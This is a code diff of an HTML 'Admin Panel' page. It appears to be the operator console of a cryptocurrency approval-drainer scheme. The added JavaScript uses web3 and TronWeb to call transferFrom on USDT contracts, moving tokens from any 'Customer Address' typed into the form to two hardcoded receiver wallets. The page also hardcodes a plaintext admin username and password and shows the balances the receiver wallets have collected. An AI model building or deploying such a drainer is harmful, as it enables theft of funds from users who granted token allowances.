@@ -2,118 +2,142 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Admin Panel - Connected Wallets</title>
+  <title>Admin Panel</title>
   <style>
     body {
-      background: radial-gradient(circle at center, #1b1b1b 0%, #0f0f0f 100%);
       font-family: Arial, sans-serif;
-      color: white;
-      margin: 0;
-      padding: 0;
-      text-align: center;
+      background: #111;
+      color: #fff;
+      padding: 30px;
     }
-    h2 {
-      margin-top: 30px;
-      color: #00ffcc;
+    .login, .panel {
+      max-width: 400px;
+      margin: auto;
+      background: #222;
+      padding: 20px;
+      border-radius: 8px;
     }
-    table {
-      margin: 30px auto;
-      border-collapse: collapse;
-      width: 90%;
-      max-width: 900px;
-    }
-    th, td {
-      border: 1px solid #444;
-      padding: 12px;
-    }
-    th {
-      background-color: #222;
-      color: #00ffcc;
-    }
-    td {
-      background-color: #111;
-    }
-    .btn {
-      padding: 8px 16px;
-      background-color: #00cc66;
-      color: white;
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      background: #333;
+      color: #fff;
       border: none;
       border-radius: 4px;
-      cursor: pointer;
     }
-    #login-box {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    #login-box input {
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 10px;
-      width: 250px;
-    }
-    #login-box button {
-      padding: 10px 20px;
+    .hidden {
+      display: none;
     }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
 
-<!-- Login Box -->
-<div id="login-box">
-  <h2>Admin Login</h2>
-  <input type="text" id="username" placeholder="Username">
-  <input type="password" id="password" placeholder="Password">
-  <button onclick="checkLogin()">Login</button>
-</div>
+  <div class="login" id="loginForm">
+    <h2>Admin Login</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+  </div>
 
-<!-- Admin Panel -->
-<div id="admin-panel" style="display: none;">
-  <h2>Admin Panel - Connected Wallets</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>Address</th>
-        <th>Network</th>
-        <th>USDT Balance</th>
-        <th>Withdraw</th>
-      </tr>
-    </thead>
-    <tbody id="walletTable">
-      <tr>
-        <td>TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</td>
-        <td>TRC-20</td>
-        <td>--</td>
-        <td><button class="btn">Withdraw</button></td>
-      </tr>
-      <tr>
-        <td>0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E</td>
-        <td>BEP-20</td>
-        <td>--</td>
-        <td><button class="btn">Withdraw</button></td>
-      </tr>
-    </tbody>
-  </table>
-</div>
+  <div class="panel hidden" id="adminPanel">
+    <h2>Admin Panel</h2>
 
-<script>
-  const correctUsername = "enre.atul";
-  const correctPassword = "Honda988701@";
+    <h4>Real-Time Balances</h4>
+    <p>🔷 TRC-20 Balance: <span id="trcBalance">Loading...</span> USDT</p>
+    <p>🟠 BEP-20 Balance: <span id="bepBalance">Loading...</span> USDT</p>
 
-  function checkLogin() {
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
+    <hr>
 
-    if (username === correctUsername && password === correctPassword) {
-      document.getElementById("login-box").style.display = "none";
-      document.getElementById("admin-panel").style.display = "block";
-    } else {
-      alert("Wrong username or password. Try again.");
+    <h4>Manual Withdraw</h4>
+    <input type="text" id="fromAddress" placeholder="Customer Address">
+    <input type="number" id="amount" placeholder="Amount in USDT">
+    <button onclick="withdrawTRC()">Withdraw TRC-20</button>
+    <button onclick="withdrawBEP()">Withdraw BEP-20</button>
+  </div>
+
+  <script>
+    const ADMIN_USER = "enre.atul";
+    const ADMIN_PASS = "Honda988701@";
+
+    const TRC20_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+    const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const RECEIVER_TRC = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+    const RECEIVER_BEP = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
+
+    const ABI = [
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "sender", "type": "address" }, { "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
+      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
+    ];
+
+    function login() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+      if (user === ADMIN_USER && pass === ADMIN_PASS) {
+        document.getElementById("loginForm").classList.add("hidden");
+        document.getElementById("adminPanel").classList.remove("hidden");
+        fetchBalances();
+      } else {
+        alert("Incorrect credentials!");
+      }
     }
-  }
-</script>
 
+    async function fetchBalances() {
+      // TRC-20
+      try {
+        const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+        const contract = await tronWeb.contract(ABI, TRC20_USDT);
+        const balance = await contract.methods.balanceOf(RECEIVER_TRC).call();
+        document.getElementById("trcBalance").innerText = (balance / 1e6).toFixed(2);
+      } catch {
+        document.getElementById("trcBalance").innerText = "Error";
+      }
+
+      // BEP-20
+      try {
+        const web3 = new Web3('https://bsc-dataseed.binance.org');
+        const contract = new web3.eth.Contract(ABI, BEP20_USDT);
+        const balance = await contract.methods.balanceOf(RECEIVER_BEP).call();
+        document.getElementById("bepBalance").innerText = (balance / 1e18).toFixed(2);
+      } catch {
+        document.getElementById("bepBalance").innerText = "Error";
+      }
+    }
+
+    async function withdrawTRC() {
+      const from = document.getElementById("fromAddress").value;
+      const amount = document.getElementById("amount").value;
+      if (!from || !amount) return alert("Enter all fields.");
+
+      try {
+        const tronWeb = window.tronWeb;
+        const contract = await tronWeb.contract(ABI, TRC20_USDT);
+        await contract.methods.transferFrom(from, RECEIVER_TRC, tronWeb.toSun(amount)).send();
+        alert("TRC-20 USDT manually withdrawn!");
+      } catch (e) {
+        alert("TRC Withdraw Error: " + e.message);
+      }
+    }
+
+    async function withdrawBEP() {
+      const from = document.getElementById("fromAddress").value;
+      const amount = document.getElementById("amount").value;
+      if (!from || !amount) return alert("Enter all fields.");
+
+      try {
+        const web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const contract = new web3.eth.Contract(ABI, BEP20_USDT);
+        await contract.methods.transferFrom(from, RECEIVER_BEP, web3.utils.toWei(amount)).send({ from: (await web3.eth.getAccounts())[0] });
+        alert("BEP-20 USDT manually withdrawn!");
+      } catch (e) {
+        alert("BEP Withdraw Error: " + e.message);
+      }
+    }
+  </script>
 </body>
 </html>
